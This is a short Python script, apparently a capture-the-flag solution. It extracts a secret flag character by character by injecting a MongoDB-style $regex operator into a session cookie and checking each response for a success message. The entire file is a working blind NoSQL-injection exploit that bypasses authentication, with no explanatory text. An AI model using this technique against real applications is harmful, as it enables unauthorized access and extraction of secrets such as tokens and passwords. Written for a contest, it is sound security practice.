import requests
import string

chars = string.ascii_letters + string.digits +"{_}"
url =  'http://chall'
flag = 'bctf{'
while True:

	for c in chars:

		tmp = flag + c
		res = requests.get(url,cookies={'session':f'{{"token":{{"$regex":"{tmp}"}},"username":"AlienAdmin"}}'})
		if 'Thank you for understanding!' in res.text:

			flag += c
			break
		if '}' in flag:
			print(flag)
			exit() 
